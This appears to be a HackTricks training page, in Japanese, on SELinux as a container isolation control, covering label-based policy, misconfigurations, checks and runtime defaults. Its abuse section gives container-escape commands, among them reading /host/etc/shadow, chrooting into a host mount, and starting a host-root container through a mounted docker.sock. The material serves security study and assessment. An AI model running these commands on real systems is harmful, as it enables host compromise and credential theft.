# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

SELinuxは**ラベルベースのMandatory Access Control（強制アクセス制御）**システムです。関連するすべてのプロセスとオブジェクトにはセキュリティコンテキストが付与される場合があり、ポリシーによって、どのドメインがどのタイプと、どのような方法で相互作用できるかが決定されます。コンテナ化された環境では通常、runtimeがコンテナプロセスを制限されたコンテナドメインで起動し、対応するタイプでコンテナの内容にラベルを付けます。ポリシーが適切に機能していれば、プロセスはラベルがアクセスすることを想定された対象を読み書きできますが、mountを通じてその内容が見えるようになった場合でも、その他のhostコンテンツへのアクセスは拒否されます。

これは、一般的なLinuxコンテナデプロイメントで利用できる、最も強力なhost側の保護機能の1つです。特にFedora、RHEL、CentOS Stream、OpenShiftなど、SELinuxを中心としたエコシステムで重要です。これらの環境では、SELinuxを無視するreviewerは、明らかに見えるhost compromiseへの経路が実際にはブロックされている理由を誤解することがよくあります。

## AppArmor Vs SELinux

大まかな違いとして最も分かりやすいのは、AppArmorがpath-basedであるのに対し、SELinuxは**label-based**である点です。これはcontainer securityに大きな影響を与えます。path-basedポリシーでは、同じhostコンテンツが予期しないmount pathで見えるようになると、異なる動作をする可能性があります。一方、label-basedポリシーでは、オブジェクトのラベルと、プロセスドメインがそのオブジェクトに対して実行できる操作が評価されます。これによりSELinuxが単純になるわけではありませんが、AppArmorベースのシステムでdefenderが誤って想定することのある、path trickに基づく仮定の一種に対して堅牢になります。

このモデルはラベル指向であるため、コンテナvolumeの処理とrelabelingの判断はsecurity-criticalです。runtimeまたはoperatorが「mountを機能させる」ためにラベルを広範囲に変更すると、workloadをcontainするはずだったポリシー境界が、意図していたよりもはるかに弱くなる可能性があります。

## ラボ

hostでSELinuxが有効かどうかを確認するには：
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
ホスト上の既存のラベルを確認するには:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
通常の実行と、ラベリングを無効にした場合の実行を比較するには:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux が有効なホストでは、これは非常に実践的なデモンストレーションです。期待される container domain の下で実行されている workload と、その enforcement layer が取り除かれた workload の違いを示しているためです。

## Runtime の使用

Podman は、SELinux が platform のデフォルトの一部となっているシステム上で、SELinux と特に相性が良い設計になっています。Rootless Podman と SELinux の組み合わせは、host 側ですでにプロセスが unprivileged であり、さらに MAC policy によって制限されるため、主流の container baseline の中でも最も強力なものの一つです。Docker も、サポートされている環境では SELinux を使用できますが、volume labeling の問題を回避するために、管理者が無効化することがあります。CRI-O と OpenShift は、container isolation の仕組みの一部として SELinux に大きく依存しています。Kubernetes でも SELinux 関連の設定を公開できますが、その価値は当然ながら、node OS が実際に SELinux をサポートし、enforce しているかどうかに左右されます。<sup>[[2]](#references)</sup>

繰り返し得られる教訓は、SELinux は付加的な飾りではないということです。SELinux を中心に構築された ecosystem では、SELinux は想定される security boundary の一部です。

## Misconfigurations

典型的なミスは `label=disable` です。運用上は、volume mount が拒否された際に、labeling model を修正するのではなく、SELinux を問題から取り除くことが最短の一時的な解決策として選ばれる場合に起こりがちです。<sup>[[1]](#references)</sup> もう一つのよくあるミスは、host content の relabeling が正しくないことです。広範な relabel operation によってアプリケーションは動作するようになるかもしれませんが、container がアクセスできる範囲が、当初意図していた範囲を大きく超えて拡大する可能性もあります。

また、**installed** SELinux と **effective** SELinux を混同しないことも重要です。host が SELinux をサポートしていても permissive mode のままの場合や、runtime が workload を期待される domain の下で起動していない場合があります。そのようなケースでは、protection は documentation が示唆するものより大幅に弱くなります。

## Abuse

SELinux が存在しない、permissive である、または workload に対して広範に無効化されている場合、host-mounted path ははるかに悪用しやすくなります。本来なら label によって制限されるはずの bind mount が、host data や host modification への直接的な経路になる可能性があります。これは、writable volume mount、container runtime directory、または利便性のために sensitive host path を公開する operational shortcut と組み合わさった場合に、特に重要です。

SELinux は、runtime flag が似ているにもかかわらず、ある host では generic breakout writeup がすぐに成功し、別の host では何度試しても失敗する理由を説明することがよくあります。欠けている要素は、namespace や capability ではなく、維持されていた label boundary であることが少なくありません。

最も速い実践的な確認方法は、active context を比較したうえで、通常なら label によって制限される mounted host path や runtime directory を probe することです。
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
ホストの bind mount が存在し、SELinux labeling が無効化または弱められている場合、情報漏えいが最初に起こることが多い：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount が書き込み可能で、kernel の観点から container が実質的に host-root である場合、次のステップは推測ではなく、制御された host の変更をテストすることです。
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux対応ホストでは、ランタイム状態ディレクトリ周辺のラベルが失われると、直接的な権限昇格経路が露呈する可能性もあります：
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
これらのコマンドは full escape chain の完全な代替にはなりませんが、SELinux が host data へのアクセスや host-side file の変更を阻止していたかどうかを、非常に迅速に明らかにできます。

### Full Example: SELinux Disabled + Writable Host Mount

SELinux の labeling が無効化され、host filesystem が `/host` に writable として mount されている場合、full host escape は通常の bind-mount abuse case になります。
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot`が成功すると、container processはホストのfilesystemから操作できる状態になります：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完全な例: SELinux 無効 + ランタイムディレクトリ

ラベルを無効にした状態で workload がランタイムソケットに到達できる場合、escape をランタイムに委任できます:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
重要な観察点は、SELinux がこの種の host-path または runtime-state へのアクセスを実際に防いでいた制御であることが多い点です。

## Checks

SELinux checks の目的は、SELinux が有効になっていることを確認し、現在の security context を特定し、対象のファイルやパスが実際に label によって制限されているかどうかを確認することです。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
ここで注目すべき点:

- `getenforce` は理想的には `Enforcing` を返すべきです。`Permissive` または `Disabled` の場合、SELinux セクション全体の意味が変わります。
- 現在のプロセスコンテキストが想定外、または広範すぎるように見える場合、workload は意図した container policy の下で実行されていない可能性があります。
- host-mounted files または runtime directories に、プロセスが過度に自由にアクセスできる labels が付いている場合、bind mounts ははるかに危険になります。

SELinux 対応 platform 上の container を確認する際は、labeling を二次的な詳細情報として扱わないでください。多くの場合、host がまだ compromise されていない主な理由の1つが labeling です。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux-enabled hosts では SELinux separation を利用できますが、正確な動作は host/daemon configuration に依存します | `--security-opt label=disable`、bind mounts の広範な relabeling、`--privileged` |
| Podman | SELinux hosts では通常 enabled | 無効化されていない限り、SELinux systems 上の Podman では SELinux separation が通常の構成要素です | `--security-opt label=disable`、`containers.conf` の `label=false`、`--privileged` |
| Kubernetes | Pod level では通常自動的に割り当てられない | SELinux support は存在しますが、通常は `securityContext.seLinuxOptions` または platform-specific defaults が必要です。runtime と node の support も必要です | 弱い、または広範な `seLinuxOptions`、permissive/disabled nodes 上での実行、labeling を無効化する platform policies |
| CRI-O / OpenShift style deployments | 通常、強く依存 | これらの environments では、SELinux が node isolation model の中核となっていることがよくあります | access を過度に広げる custom policies、compatibility のための labeling の無効化 |

SELinux defaults は seccomp defaults よりも distribution-dependent です。Fedora/RHEL/OpenShift-style systems では、SELinux が isolation model の中心となっていることがよくあります。non-SELinux systems では、単に存在しません。

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
